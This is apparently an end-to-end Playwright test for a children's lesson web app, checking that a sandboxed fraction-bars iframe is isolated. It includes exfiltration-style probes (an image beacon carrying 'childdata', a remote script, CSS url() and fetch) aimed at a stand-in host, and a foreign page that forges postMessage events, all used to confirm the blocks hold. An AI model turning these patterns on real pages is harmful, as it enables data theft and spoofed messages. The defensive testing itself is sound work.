// End-to-end TEXT-MODE check of the client live-lesson runtime in real Chromium (not part of `npm test`:
// it needs the network for Neon + Azure).
//
//   NODE_USE_ENV_PROXY=1 node tests/client-e2e.mjs [--prod] [--strict-autoplay] [--base <url>] [--mock] [--shots <dir>]
//
// Without --base it starts its own API (the dev-api code path: .env.local + server/index.js) and a Vite dev
// server on spare ports, so it never collides with servers other work has running. --prod instead builds
// the app (with the dev routes) into a temp dir and serves it through server/serve.mjs, exactly as
// production does: the build-only frame CSP, the HTTP headers, and the opaque-origin frame loading its
// hashed bundles over CORS (without the header, every module frame rendered nothing in production).
// --strict-autoplay drops Chromium's --autoplay-policy override, so audio must start from the real click.
//
// It drives /dev/lesson: create a test family → start a text lesson → two child turns → mount fraction-bars
// → isolation probes (fetch, image beacon, remote script, CSS url()) → shade 3/4 → goal_met is a module-only
// Director turn → highlight/reveal → compare mode → unknown engine shows "coming soon" → a frame navigated to
// a foreign page is dropped and cannot forge a goal → end.
// With the real Director it checks what the Director does with a module-only turn (no repair, the plan does
// not move). With --mock (or when /api/lesson/* is not implemented) the lesson routes and /api/tts are
// answered IN THIS TEST ONLY by a scripted Director, which makes the exact request-shape checks
// deterministic at no model cost; auth, consent and every client file still run for real.
import http from "http";
import { spawn } from "child_process";
import { readFileSync, mkdirSync, mkdtempSync, rmSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import assert from "node:assert/strict";
import { chromium } from "playwright";

const ROOT = new URL("..", import.meta.url).pathname;
const arg = (name) => {
  const i = process.argv.indexOf(name);
  return i > 0 ? process.argv[i + 1] : undefined;
};
const flag = (name) => process.argv.includes(name);
const shots = arg("--shots");
if (shots) mkdirSync(shots, { recursive: true });
const results = [];
const check = (name, ok, detail = "") => {
  results.push({ name, ok: !!ok, detail });
  console.log(`${ok ? "PASS" : "FAIL"} ${name}${detail ? ` — ${detail}` : ""}`);
};

// ───────────── servers ─────────────
let base = arg("--base");
const prod = flag("--prod");
const stops = [];
if (!base) {
  for (const line of readFileSync(ROOT + ".env.local", "utf8").split("\n")) {
    const m = line.match(/^([A-Z0-9_]+)=(.*)$/);
    if (m && !process.env[m[1]]) process.env[m[1]] = m[2].replace(/^"(.*)"$/, "$1");
  }
}
if (!base && prod) {
  const outDir = mkdtempSync(join(tmpdir(), "taxila-prod-e2e-"));
  stops.push(() => rmSync(outDir, { recursive: true, force: true }));
  process.env.VITE_DEV_ROUTES = "1"; // the dev screen this test drives; a real deploy builds without it
  const { build } = await import("vite");
  await build({ root: ROOT, configFile: ROOT + "vite.config.ts", logLevel: "warn", build: { outDir, emptyOutDir: true } });
  const port = await new Promise((r) => {
    const s = http.createServer().listen(0, "127.0.0.1", () => {
      const p = s.address().port;
      s.close(() => r(p));
    });
  });
  const server = spawn(process.execPath, [ROOT + "server/serve.mjs"], { env: { ...process.env, PORT: String(port), TAXILA_DIST: outDir }, stdio: ["ignore", "pipe", "inherit"] });
  stops.push(() => server.kill());
  await new Promise((resolve, reject) => {
    server.stdout.on("data", (d) => String(d).includes(`:${port}`) && resolve());
    server.on("exit", (code) => reject(new Error(`serve.mjs exited (${code})`)));
  });
  base = `http://localhost:${port}`;
  console.log(`servers: production build served by serve.mjs at ${base}`);
} else if (!base) {
  const { handle } = await import("../server/index.js");
  const api = http.createServer(handle);
  await new Promise((r) => api.listen(0, "127.0.0.1", r));
  const apiPort = api.address().port;
  stops.push(() => api.close());
  const { createServer } = await import("vite");
  const vite = await createServer({
    root: ROOT,
    configFile: ROOT + "vite.config.ts",
    logLevel: "warn",
    server: { port: 0, strictPort: false, proxy: { "/api": `http://127.0.0.1:${apiPort}` } },
  });
  await vite.listen();
  stops.push(() => vite.close());
  base = vite.resolvedUrls.local[0].replace(/\/$/, "");
  console.log(`servers: app ${base}, api :${apiPort}`);
}

// Is the real lesson Director there? A missing route answers 404 "no route ..."; a real one 400/401.
const probe = await fetch(`${base}/api/lesson/start`, { method: "POST", headers: { "content-type": "application/json" }, body: "{}" });
const probeBody = await probe.text();
const routesMissing = probe.status === 404 && probeBody.includes("no route");
const mockDirector = routesMissing || flag("--mock");
console.log(mockDirector ? `lesson routes: scripted mock Director (${routesMissing ? "routes not implemented" : "--mock"}; test-only)` : `lesson routes: real (probe ${probe.status})`);

// ───────────── browser ─────────────
const strictAutoplay = flag("--strict-autoplay");
const browser = await chromium.launch({
  executablePath: "/opt/pw-browsers/chromium",
  args: strictAutoplay ? [] : ["--autoplay-policy=no-user-gesture-required"],
});
console.log(strictAutoplay ? "autoplay: browser default (audio must start from the real click)" : "autoplay: no user gesture required");
const context = await browser.newContext({ viewport: { width: 360, height: 900 } });
const page = await context.newPage();
const consoleErrors = [];
page.on("console", (m) => {
  if (m.type() === "error") consoleErrors.push(`${m.location()?.url?.split("/").pop() || "?"}: ${m.text()}`);
});
page.on("pageerror", (e) => consoleErrors.push(`pageerror: ${e.message}`));

// A foreign origin for the isolation probes. A request that reaches it got past the frame's CSP; /nav is
// the navigation probe (CSP cannot stop a frame navigating itself; the host must stop trusting it).
const LEAK = "http://leak.invalid";
const leaks = [];
await context.route(`${LEAK}/**`, (route) => {
  const url = route.request().url();
  if (url.startsWith(`${LEAK}/nav-silent`)) {
    // A foreign page that never speaks: only the frame's load events can give it away.
    return route.fulfill({ contentType: "text/html", body: "<!doctype html><p>a page that is not the lesson</p>" });
  }
  if (url.startsWith(`${LEAK}/nav`)) {
    const id = decodeURIComponent(new URL(url).searchParams.get("id") ?? "");
    return route.fulfill({
      contentType: "text/html",
      body: `<!doctype html><script>parent.postMessage({ type: "goal_met", moduleId: ${JSON.stringify(id)}, goal: "forged" }, "*");
        parent.postMessage({ type: "answer", moduleId: ${JSON.stringify(id)}, value: "forged", correct: true }, "*");</script>`,
    });
  }
  leaks.push(url);
  return route.fulfill({ status: 200, body: "" });
});

/** 0.3 s of 8 kHz silence: the mock Director's stand-in for TTS audio (its lessons have no stored turns). */
function silentWav() {
  const n = 2400;
  const b = Buffer.alloc(44 + n * 2);
  b.write("RIFF", 0); b.writeUInt32LE(36 + n * 2, 4); b.write("WAVE", 8); b.write("fmt ", 12);
  b.writeUInt32LE(16, 16); b.writeUInt16LE(1, 20); b.writeUInt16LE(1, 22); b.writeUInt32LE(8000, 24);
  b.writeUInt32LE(16000, 28); b.writeUInt16LE(2, 32); b.writeUInt16LE(16, 34); b.write("data", 36); b.writeUInt32LE(n * 2, 40);
  return b;
}

const director = { turns: [], ends: [], starts: [] };
if (mockDirector) {
  let n = 0;
  await page.route("**/api/tts", (route) => route.fulfill({ status: 200, contentType: "audio/wav", body: silentWav() }));
  await page.route("**/api/lesson/**", async (route) => {
    const url = new URL(route.request().url());
    const body = route.request().postDataJSON() ?? {};
    const json = (b) => route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(b) });
    if (url.pathname === "/api/lesson/start") {
      director.starts.push(body);
      return json({
        lessonId: "mock-lesson-1",
        topic: { id: "c4-maths-fractions", title: "Halves and quarters", chapter: "Fractions" },
        teacher: { id: "asha", name: "Asha", voice: "marin" },
        moduleCommands: [],
        ui: { whiteboard: { kind: "text", value: "3/4" } },
        teacherOpening: "Namaste Aarav! Aaj hum fractions dekhenge.",
        teacherOpeningSeq: 1,
      });
    }
    if (url.pathname === "/api/lesson/turn") {
      director.turns.push(body);
      n++;
      const goal = body.moduleEvents?.find((e) => e.type === "goal_met");
      const mount = n === 2 && [{ op: "mount", moduleId: "fb-1", engine: "fraction-bars@1", params: { denominators: [4], target: "3/4" }, goal: "shade 3/4" }];
      const moduleOnly = !body.childText && !body.chipId && !!body.moduleEvents?.length;
      return json({
        move: { kind: mount ? "show_module" : goal ? "celebrate" : "probe", shape: "mock" },
        moduleCommands: mount || [],
        ui: mount ? { chips: [{ id: "c-ready", label: "Ready" }] } : {},
        // Like the real Director: a module-only turn with nothing to react to gets no reply (a hold).
        ...(moduleOnly && !goal ? {} : {
          teacherReply: goal ? "Teen hisse rang diye: three quarters." : `Turn ${n}: tumne kaha ${body.childText || "kuch nahi"}.`,
          teacherReplySeq: n + 1,
        }),
      });
    }
    if (url.pathname === "/api/lesson/end") {
      director.ends.push(body);
      return json({ ok: true });
    }
    return route.continue();
  });
}

// Every Director request and answer the page saw (real or mocked).
const turnRequests = [];
const ttsRequests = [];
page.on("request", (r) => {
  if (r.url().endsWith("/api/lesson/turn")) turnRequests.push(r.postDataJSON());
  if (r.url().endsWith("/api/tts")) ttsRequests.push(r.postDataJSON());
});
const turnResponses = [];
/** Text-lane lesson responses that carried the compiled instructions (they hold the answer key). */
const instructionLeaks = [];
page.on("response", async (r) => {
  const lessonRoute = r.url().endsWith("/api/lesson/turn") || r.url().endsWith("/api/lesson/start");
  if (!lessonRoute || r.status() >= 300) return;
  const b = await r.json().catch(() => null);
  if (b && "instructions" in b) instructionLeaks.push(new URL(r.url()).pathname);
  if (!r.url().endsWith("/api/lesson/turn")) return;
  if (b) turnResponses.push({ move: b.move?.kind, moduleCommands: b.moduleCommands, end: b.end, speakNow: b.speakNow, debug: b.debug && { teachIdx: b.debug.teachIdx, unclear: b.debug.unclear, moduleOnly: b.debug.moduleOnly, hold: b.debug.hold, phase: b.debug.phase } });
});
const ttsResponses = [];
const assetHeaders = [];
let frameHeaders = null;
page.on("response", (r) => {
  const path = new URL(r.url()).pathname;
  if (path === "/api/tts") ttsResponses.push({ status: r.status(), type: r.headers()["content-type"] });
  if (path === "/modules.html") frameHeaders = r.headers();
  if (path.startsWith("/assets/") && path.endsWith(".js")) assetHeaders.push(r.headers()["access-control-allow-origin"]);
});
const speechType = mockDirector ? "audio/wav" : "audio/mpeg";

const teacherCaptions = () => page.locator('[data-testid="caption"][data-who="teacher"]');
// A real child waits for the teacher to finish; typing over her is a barge-in (it aborts her speech).
const yourTurn = () =>
  page.waitForFunction(() => document.querySelector('[data-testid="status"]')?.getAttribute("data-status") === "your_turn", null, { timeout: 30_000 });
// Before clicking anything: no Director call in flight and the teacher quiet. A Director answer can change
// the whiteboard/chips and shift the layout under a pending click (seen with the real Director: a click
// meant for a dev button landed on a fraction part inside the frame).
// Scroll first, let the page come to rest, then click. Clicking in the same step as a long programmatic
// scroll delivered a parent-page button click to an out-of-process module frame (a stray shade on part 4).
const tap = async (locator) => {
  await locator.scrollIntoViewIfNeeded();
  await page.waitForTimeout(250);
  await locator.click();
};
const settled = () =>
  page.waitForFunction(
    () =>
      document.querySelector('[data-testid="pending"]')?.getAttribute("data-pending") === "0" &&
      document.querySelector('[data-testid="status"]')?.getAttribute("data-status") === "your_turn",
    null,
    { timeout: 45_000 },
  );
const shot = async (name) => shots && page.screenshot({ path: `${shots}/${name}.png`, fullPage: true });
const moduleFrame = (moduleId) => page.frames().find((f) => f.url().includes(`/modules.html#${moduleId}`));
const lastMountedId = () => page.locator("[data-module-host] > div[data-module-id]").last().getAttribute("data-module-id");

try {
  await page.goto(`${base}/dev/lesson`);
  await page.getByTestId("create-family").click();
  await page.getByTestId("start").waitFor({ timeout: 20_000 });
  check("test family created (signup + child + consent) and signed in", true);

  await page.getByTestId("mode-text").check();
  await page.getByTestId("start").click();
  await page.waitForFunction(() => document.querySelector('[data-testid="phase"]')?.textContent?.includes("live"), null, { timeout: 30_000 });
  await teacherCaptions().first().waitFor({ timeout: 20_000 });
  const opening = await teacherCaptions().first().textContent();
  check("text lesson started, teacher opening shown", /Namaste|.+/.test(opening ?? ""), opening?.trim());
  await yourTurn();
  check("status reaches 'your turn' after the teacher speaks", true);
  check(`opening spoken via /api/tts (${speechType})`, ttsResponses[0]?.status === 200 && ttsResponses[0]?.type === speechType, JSON.stringify(ttsResponses[0]));
  await shot("1-opening");

  for (const [i, said] of ["teen chauthai matlab teen hisse", "haan samajh gaya"].entries()) {
    await page.getByTestId("child-input").fill(said);
    await page.getByTestId("send").click();
    await page.waitForFunction((k) => document.querySelectorAll('[data-testid="caption"][data-who="teacher"]').length >= k, i + 2, { timeout: 45_000 });
    const reply = await teacherCaptions().nth(i + 1).textContent();
    check(`child turn ${i + 1} → teacher reply shown`, !!reply?.trim(), reply?.trim());
    await yourTurn();
  }
  const [t1, t2] = turnRequests;
  check("turn 1 request: typed child text", t1?.childText === "teen chauthai matlab teen hisse" && t1?.typed === true, JSON.stringify(t1));
  check("text mode never echoes the server's own teacher lines back (they were stored twice)", !("teacherText" in (t1 ?? {})) && !("teacherText" in (t2 ?? {})), JSON.stringify([t1?.teacherText, t2?.teacherText]));
  check("/api/tts speaks a stored turn by seq, never free text", ttsRequests.length > 0 && ttsRequests.every((b) => b && typeof b.lessonId === "string" && Number.isInteger(b.seq) && !("text" in b) && !("voice" in b)), JSON.stringify(ttsRequests.slice(0, 2)));

  // Module: Director-mounted in mock mode, otherwise mounted by the dev button.
  await settled();
  if (!mockDirector) await tap(page.getByTestId("dev-mount"));
  const iframe = page.locator("iframe[data-engine='fraction-bars@1']").first();
  await iframe.waitFor({ timeout: 15_000 });
  check("iframe is sandboxed allow-scripts only", (await iframe.getAttribute("sandbox")) === "allow-scripts");
  const frame = page.frameLocator("iframe[data-engine='fraction-bars@1']").first();
  await frame.locator(".fb-part").first().waitFor({ timeout: 15_000 });
  check("fraction-bars@1 mounted and rendered inside the frame", (await frame.locator(".fb-part").count()) === 4);
  if (mockDirector) check("Director chips rendered", (await page.getByTestId("chips").locator("button").count()) === 1);
  const fbFrame = page.frames().find((f) => f.url().includes("/modules.html#"));
  const isolation = await fbFrame.evaluate(() => {
    const blocked = (fn) => { try { fn(); return false; } catch { return true; } };
    return { parentDom: blocked(() => window.parent.document.title), cookie: blocked(() => document.cookie), storage: blocked(() => localStorage.length), origin: self.origin };
  });
  check("frame is isolated (no parent DOM, cookies or storage; opaque origin)", isolation.parentDom && isolation.cookie && isolation.storage && isolation.origin === "null", JSON.stringify(isolation));
  const csp = await fbFrame.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute("content") ?? "");
  const firstInHead = await fbFrame.evaluate(() => document.head.firstElementChild?.getAttribute("http-equiv") === "Content-Security-Policy");
  const scriptSrc = csp.split(";").map((d) => d.trim()).find((d) => d.startsWith("script-src"));
  check(`frame CSP is the ${prod ? "strict build" : "dev"} policy, first in <head>`,
    firstInHead && /default-src 'none'/.test(csp) && /connect-src 'none'/.test(csp) && scriptSrc === (prod ? "script-src 'self'" : "script-src 'self' 'unsafe-inline'"), csp);
  // Each probe aims at a foreign origin; a request that reaches it got past the CSP.
  const probes = await fbFrame.evaluate(async (leak) => {
    const violations = new Set();
    const refused = new Set();
    document.addEventListener("securitypolicyviolation", (e) => {
      violations.add(e.effectiveDirective);
      refused.add(e.blockedURI.replace(leak, ""));
    });
    const img = new Image();
    img.src = `${leak}/img?leak=childdata`;
    document.body.append(img);
    const script = document.createElement("script");
    script.src = `${leak}/x.js`;
    document.head.append(script);
    const div = document.createElement("div");
    div.style.cssText = `width:4px;height:4px;background-image:url(${leak}/css)`;
    document.body.append(div);
    // The background image is fetched only once the div's style is resolved and painted: force both, then
    // wait for its violation (bounded) instead of a fixed sleep that could end first.
    void getComputedStyle(div).backgroundImage;
    // (Chromium throttles rAF in an off-screen cross-origin frame, so the wait is bounded.)
    await Promise.race([new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))), new Promise((r) => setTimeout(r, 500))]);
    const fetched = await fetch(`${leak}/fetch`).then(() => "reached", () => "blocked");
    const local = await fetch("/api/health").then(() => "reached", () => "blocked");
    const want = ["/img?leak=childdata", "/x.js", "/css", "/fetch"];
    for (const until = Date.now() + 5000; Date.now() < until && !want.every((u) => refused.has(u));) {
      await new Promise((r) => setTimeout(r, 50));
    }
    img.remove(); script.remove(); div.remove();
    return { violations: [...violations].sort(), refused: [...refused].sort(), fetched, local };
  }, LEAK);
  check("frame has no network: fetch (foreign and same-origin) refused", probes.fetched === "blocked" && probes.local === "blocked", JSON.stringify(probes));
  check("frame CSP refuses a remote image beacon, script and CSS url()",
    ["/img?leak=childdata", "/x.js", "/css", "/fetch"].every((u) => probes.refused.includes(u)) && probes.violations.includes("img-src") && probes.violations.some((d) => d.startsWith("script-src")),
    `${probes.violations.join(",")} refused ${probes.refused.join(" ")}`);
  check("no probe request reached the foreign origin", leaks.length === 0, leaks.join(" "));
  await shot("2-module");

  const turnsBefore = turnRequests.length;
  const responsesBefore = turnResponses.length;
  await settled();
  await iframe.scrollIntoViewIfNeeded(); // in-frame targets: bring the <iframe> into view, then click inside it
  await page.waitForTimeout(250);
  for (const k of [0, 1, 2]) await frame.locator(`.fb-part[data-part="${k}"]`).click();
  await page.waitForFunction(() => !!document.querySelector('[data-testid="module-events"] li[data-type="goal_met"]'), null, { timeout: 10_000 });
  check("shading 3 of 4 parts → goal_met event", true, await frame.locator(".fb-label").first().textContent());
  const shadeEvents = await page.locator('[data-testid="module-events"] li[data-type="interaction"]').count();
  check("shade_changed interactions reported", shadeEvents >= 3, `${shadeEvents} interactions`);
  await page.waitForFunction(() => document.querySelector('[data-testid="pending"]')?.getAttribute("data-pending") === "0", null, { timeout: 30_000 });
  await page.waitForTimeout(300);
  const sent = turnRequests.slice(turnsBefore);
  const milestone = sent.find((t) => t.moduleEvents?.some((e) => e.type === "goal_met"));
  check("goal_met called the Director at once, as a module-only turn with the batched shade events", sent.length === 1 && !!milestone && milestone.childText === "" && !("teacherText" in milestone) && milestone.moduleEvents.filter((e) => e.name === "shade_changed").length === 3, JSON.stringify(sent.map((t) => t.moduleEvents?.map((e) => `${e.type}:${e.name}`))));
  if (mockDirector) {
    await page.waitForFunction(() => document.querySelectorAll('[data-testid="caption"][data-who="teacher"]').length >= 4, null, { timeout: 30_000 });
    check("teacher reacted to the milestone", /three quarters/.test((await teacherCaptions().nth(3).textContent()) ?? ""));
  } else {
    const before = turnResponses[responsesBefore - 1];
    const after = turnResponses.slice(responsesBefore).find((r) => r.debug?.moduleOnly);
    check("real Director: the move after goal_met is not a repair, and the lesson plan did not move",
      !!after && after.move !== "repair" && after.debug.teachIdx === before?.debug?.teachIdx && after.debug.unclear === before?.debug?.unclear,
      JSON.stringify({ before: before && { move: before.move, ...before.debug }, after: after && { move: after.move, ...after.debug } }));
  }
  await yourTurn();

  await settled();
  await tap(page.getByRole("button", { name: "Highlight bar 0" }));
  await frame.locator(".fb-outline.is-highlight").waitFor({ timeout: 5_000 });
  check("highlight command reaches the engine", true);
  await tap(page.getByRole("button", { name: "Reveal" }));
  await frame.locator(".fb-part.is-ghost").first().waitFor({ timeout: 5_000 });
  check("reveal command reaches the engine (target outlined)", (await frame.locator(".fb-part.is-ghost").count()) === 3);

  // Compare mode: tap the bigger bar (3/4 vs 2/3) → answer(correct) + goal_met.
  await settled();
  await tap(page.getByRole("button", { name: "Mount compare 3/4 vs 2/3" }));
  const cmp = page.frameLocator("iframe[data-engine='fraction-bars@1']").last();
  await page.locator("iframe[data-engine='fraction-bars@1']").last().scrollIntoViewIfNeeded();
  await page.waitForTimeout(250);
  await cmp.locator('.fb-choice[data-bar="0"]').click();
  await page.waitForFunction(() => [...document.querySelectorAll('[data-testid="module-events"] li[data-type="answer"]')].some((li) => li.textContent.includes('"correct":true')), null, { timeout: 10_000 });
  check("compare mode: tapping 3/4 over 2/3 is a correct answer", true);
  await settled();
  const errorCallsBefore = turnRequests.length;
  await tap(page.getByTestId("dev-mount-unknown"));
  const unknown = page.frameLocator("iframe[data-engine='clock-calendar@1']");
  await unknown.locator('.frame-card[data-card="coming-soon"]').waitFor({ timeout: 15_000 });
  check("unknown engine → 'coming soon' card, in the child's language", /jald/i.test((await unknown.locator(".frame-card").textContent()) ?? ""), (await unknown.locator(".frame-card").textContent())?.trim());
  await page.waitForFunction(() => [...document.querySelectorAll('[data-testid="module-events"] li[data-type="error"]')].some((li) => li.textContent.includes("unknown engine")), null, { timeout: 5_000 });
  await page.waitForTimeout(500);
  check("unknown engine emits an error event that waits for the next call (not a milestone)", turnRequests.length === errorCallsBefore, `${turnRequests.length - errorCallsBefore} calls`);
  await shot("3-unknown");

  // A frame that navigates keeps the same event.source and origin "null": the page it lands on must not be
  // able to speak as the engine (module answers are machine truth to the Director).
  await settled();
  await tap(page.getByTestId("dev-mount"));
  const navId = await lastMountedId();
  await page.frameLocator(`iframe[src$="#${navId}"]`).locator(".fb-part").first().waitFor({ timeout: 15_000 });
  const navCallsBefore = turnRequests.length;
  await moduleFrame(navId).evaluate((url) => { location.href = url; }, `${LEAK}/nav?id=${encodeURIComponent(navId)}`);
  await page.locator(`[data-module-id="${navId}"][data-status="dead"]`).waitFor({ timeout: 10_000 });
  await page.waitForTimeout(800);
  const forged = await page.locator('[data-testid="module-events"] li').filter({ hasText: "forged" }).count();
  check("a frame navigated to a foreign page is dropped; its forged goal_met/answer never reach the Director",
    forged === 0 && turnRequests.slice(navCallsBefore).every((t) => !JSON.stringify(t.moduleEvents ?? []).includes("forged")),
    `${forged} forged events shown, ${turnRequests.length - navCallsBefore} calls`);

  // The same, for a page that sends nothing: the host sees a second load event on the frame and drops it.
  await settled();
  await tap(page.getByTestId("dev-mount"));
  const silentId = await lastMountedId();
  await page.frameLocator(`iframe[src$="#${silentId}"]`).locator(".fb-part").first().waitFor({ timeout: 15_000 });
  await moduleFrame(silentId).evaluate((url) => { location.href = url; }, `${LEAK}/nav-silent`);
  await page.locator(`[data-module-id="${silentId}"][data-status="dead"]`).waitFor({ timeout: 10_000 }).catch(() => {});
  const silentDead = await page.locator(`[data-module-id="${silentId}"][data-status="dead"]`).count();
  const silentFrames = await page.locator(`[data-module-id="${silentId}"] iframe`).count();
  check("a frame that navigates silently is dropped and taken off screen", silentDead === 1 && silentFrames === 0, `dead=${silentDead} frames=${silentFrames}`);

  await settled();
  await tap(page.getByTestId("end"));
  await page.waitForFunction(() => document.querySelector('[data-testid="phase"]')?.textContent?.includes("ended"), null, { timeout: 30_000 });
  check("lesson ended", true);
  if (mockDirector) check("POST /api/lesson/end called once with the lesson id", director.ends.length === 1 && director.ends[0]?.lessonId === "mock-lesson-1");
  // A reply that arrives while the previous one is still being fetched supersedes it (its request is
  // aborted), so count only that every completed speech request succeeded, for at least the four turns
  // the test waited out (opening, two child turns, the goal milestone).
  check("teacher replies spoken via /api/tts", ttsResponses.length >= 4 && ttsResponses.every((r) => r.status === 200 && r.type === speechType), `${ttsResponses.length} × ${JSON.stringify(ttsResponses[0])}`);
  if (prod) {
    check("serve.mjs: /modules.html carries the HTTP sandbox + frame-ancestors policy", frameHeaders?.["content-security-policy"] === "sandbox allow-scripts; frame-ancestors 'self'", frameHeaders?.["content-security-policy"]);
    check("serve.mjs: hashed bundles are CORS-readable (the opaque-origin frame loads them with Origin: null)", assetHeaders.length > 0 && assetHeaders.every((h) => h === "*"), `${assetHeaders.length} bundles`);
  }
  check("text lane: the compiled instructions (they carry the answer key) never reach the browser", instructionLeaks.length === 0, instructionLeaks.join(" "));
  // Expected: the signed-out /api/me probe (401), the app shell's missing favicon (dev server), and the
  // frame's CSP refusing Vite's HMR socket (dev) and this test's own probes.
  const cspRefusal = (e) => /Content Security Policy/.test(e) && (/'ws:\/\//.test(e) || /\/api\/health/.test(e) || e.includes(LEAK));
  const expected = (e) => /^me: .*401/.test(e) || /^favicon\.ico: .*404/.test(e) || cspRefusal(e) || /leak\.invalid/.test(e);
  const relevant = consoleErrors.filter((e) => !expected(e));
  check("no unexpected console errors", relevant.length === 0, relevant.join(" | "));
} catch (err) {
  check("e2e flow", false, String(err?.stack || err));
  console.log("director answers:", JSON.stringify(turnResponses));
  await shot("error");
} finally {
  await browser.close();
  for (const stop of stops.reverse()) await stop();
}

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} checks passed${mockDirector ? " (lesson routes mocked in-test)" : ""}${prod ? " (production build via serve.mjs)" : ""}`);
process.exitCode = failed.length ? 1 : 0;
assert.ok(results.length > 0);
